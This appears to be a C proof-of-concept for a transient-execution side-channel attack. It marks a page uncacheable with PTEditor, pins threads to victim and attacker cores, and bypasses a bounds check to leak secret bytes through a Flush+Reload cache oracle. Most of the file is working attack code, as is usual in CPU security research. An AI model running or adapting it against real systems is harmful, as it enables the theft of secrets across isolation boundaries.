
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>
#include <setjmp.h>
#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>

#include "config.h"
#include "cacheutils.h"
#include "../PTEditor/ptedit_header.h"

#define PAGE_SIZE 4096
#define CACHE_SIZE 64

uint8_t __attribute__((aligned(PAGE_SIZE))) throttle[8 * 4096];

/* see asm.S */
extern uint64_t CACHE_THRESHOLD;
extern uint32_t *address_index;
extern uint8_t *address_buffer;
extern uint8_t *address_secret;
extern uint8_t *oracles;

extern void load_vmm(uint32_t *data);
extern void victim_gadget(uint32_t *index, uint8_t *data);

void setup_oracle()
{
    printf("[+] Flush+Reload Threshold: ");
    CACHE_MISS = detect_flush_reload_threshold();
    printf("%lu\n", CACHE_MISS);
    for (int i = 0; i < 256; i++)
    {
        flush((uint8_t *)&oracles + i * PAGE_SIZE);
    }
}

void setup_pages()
{
    ptedit_init();

    int mt_type[] = {PTEDIT_MT_UC, PTEDIT_MT_WC, PTEDIT_MT_WT};
    int mt[sizeof(mt_type) / sizeof(int)];
    for (int i = 0; i < sizeof(mt) / sizeof(int); i++)
    {
        mt[i] = ptedit_find_first_mt(mt_type[i]);
        if (mt[i] == -1)
        {
            printf("MT not available!\n");
            exit(1);
        }
    }

    uint8_t *ptr = NULL;
    ptedit_entry_t entry;

    ptr = (uint8_t *)&address_index;
    ptr[0] = ptr[0] + 1 - 1;
    entry = ptedit_resolve(ptr, 0);
    entry.pte = ptedit_apply_mt(entry.pte, mt[0]);
    entry.valid = PTEDIT_VALID_MASK_PTE;
    ptedit_update(ptr, 0, &entry);

    ptedit_cleanup();
}

uint32_t shadow_index[16 * 8] = {0};

void set_cpu(int cpuid)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpuid, &cpuset);
    int result = pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    if (result != 0)
    {
        printf("pthread_setaffinity_np failed!");
        exit(1);
    }
}

void *fill_buffer(void *ptr)
{
    set_cpu(CPU_VICTIM);

    while (1)
    {
        load_vmm(&shadow_index[16 * 0]);
        load_vmm(&shadow_index[16 * 1]);
        load_vmm(&shadow_index[16 * 2]);
        load_vmm(&shadow_index[16 * 3]);
        load_vmm(&shadow_index[16 * 4]);
        load_vmm(&shadow_index[16 * 5]);
        load_vmm(&shadow_index[16 * 6]);
        load_vmm(&shadow_index[16 * 7]);
    }
}

int main(int argc, char *argv[])
{
    if (argc > 1)
    {
        uint32_t idx = atoi(argv[1]);
        for (int c = 0; c < 8; c++)
            for (int i = 0; i < 16; i++)
                shadow_index[c * 16 + i] = idx;

        *(uint32_t *)&address_index = 0;
        if (idx < 4096) // Security check
        {
            *(uint32_t *)&address_index = idx;
        }
    }

    printf("Secure index: %u\n", *(uint32_t *)&address_index);
    printf("Attacker index: %u\n", shadow_index[0]);

    setup_pages();

    pthread_t tHelper;
    pthread_create(&tHelper, NULL, fill_buffer, NULL);

    set_cpu(CPU_ATTACKER);
    setup_oracle();

    while (1)
    {
        victim_gadget((uint32_t *)&address_index, (uint8_t *)&address_buffer);

        for (size_t i = 1; i < 256; i++)
        {
            int mix_i = i;
            if (flush_reload((uint8_t *)&oracles + mix_i * PAGE_SIZE))
            {
                fprintf(stdout, "%c ", (uint8_t)i);
                fflush(stdout);
            }
        }
    }
    return 0;
}
